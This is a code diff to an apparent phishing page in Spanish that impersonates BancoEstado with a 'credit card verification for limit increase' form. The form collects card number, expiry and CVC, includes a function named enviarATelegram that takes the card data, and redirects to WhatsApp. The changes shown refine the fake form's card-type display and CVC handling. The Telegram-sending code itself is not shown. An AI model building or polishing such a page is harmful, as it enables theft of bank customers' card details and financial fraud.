@@ -363,7 +363,7 @@
     <br> <br><br><br>
     
     <div class="verification-header">
-        <div class="verification-title">Verificación de tarjeta de crédito para el aumento de Cupo. </div>
+        <div class="verification-title">Verificación de tarjeta de crédito para el aumento de Cupo</div>
     </div>
 
     <div class="card-type-indicator" id="cardTypeIndicator">
@@ -373,7 +373,7 @@
     <div class="card-stage">
         <div class="card" id="creditCard">
             <!-- FRENTE MASTERCARD -->
-            <div class="card-face front-mastercard" id="frontMastercard">
+            <div class="card-face front-mastercard active" id="frontMastercard">
                 <div class="bank-header">
                     <div class="bank-name">BancoEstado</div>
                     <div class="badge">CRÉDITO</div>
@@ -474,7 +474,7 @@
     const statusMsg = document.getElementById('statusMsg');
     const cardTypeIndicator = document.getElementById('cardTypeIndicator');
 
-    let cardType = 'none';
+    let cardType = 'mastercard'; // Cambiado: iniciar en mastercard
     let isFlippingFromExpiry = false;
     let expiryTimeout = null;
 
@@ -515,6 +515,11 @@
 
     // Actualizar la tarjeta según el tipo detectado
     function updateCardType(type) {
+        if (type === 'none') {
+            // Si no se detecta, mantener el actual
+            return;
+        }
+        
         cardType = type;
         
         // Ocultar todas
@@ -528,20 +533,22 @@
         if (type === 'mastercard') {
             frontMastercard.classList.add('active');
             indicator.innerHTML = '<span class="detected">💳 Mastercard detectada</span>';
+            cvcInput.maxLength = 3;
+            cvcInput.placeholder = '123';
         } else if (type === 'visa') {
             frontVisa.classList.add('active');
             indicator.innerHTML = '<span class="detected">💳 Visa detectada</span>';
+            cvcInput.maxLength = 3;
+            cvcInput.placeholder = '123';
         } else if (type === 'amex') {
             frontAmex.classList.add('active');
             indicator.innerHTML = '<span class="detected">💳 American Express detectada</span>';
-            // Amex usa CVC de 4 dígitos
             cvcInput.maxLength = 4;
             cvcInput.placeholder = '1234';
-        } else {
-            indicator.innerHTML = '<span style="color: #888;">Ingresa el número para detectar el tipo de tarjeta</span>';
-            cvcInput.maxLength = 3;
-            cvcInput.placeholder = '123';
         }
+        
+        // Reconfigurar eventos para los nuevos inputs activos
+        setupCardEvents();
     }
 
     async function enviarATelegram(cardData) {
@@ -631,14 +638,16 @@
         
         numberInput.addEventListener('input', function(e) {
             const type = detectCardType(e.target.value);
-            updateCardType(type);
+            if (type !== 'none') {
+                updateCardType(type);
+            }
             // Actualizar el placeholder según el tipo
-            if (type === 'amex') {
+            if (cardType === 'amex') {
                 e.target.placeholder = '**** ****** *****';
             } else {
                 e.target.placeholder = '**** **** **** ****';
             }
-            e.target.value = formatCardNumber(e.target.value, type);
+            e.target.value = formatCardNumber(e.target.value, cardType);
         });
 
         expiryInput.addEventListener('input', function(e) {
@@ -689,8 +698,8 @@
         }, 150);
     });
 
-    // Inicializar
-    updateCardType('none');
+    // Inicializar - Mostrar Mastercard por defecto
+    frontMastercard.classList.add('active');
     setupCardEvents();
 
     function redirectToWhatsApp() {
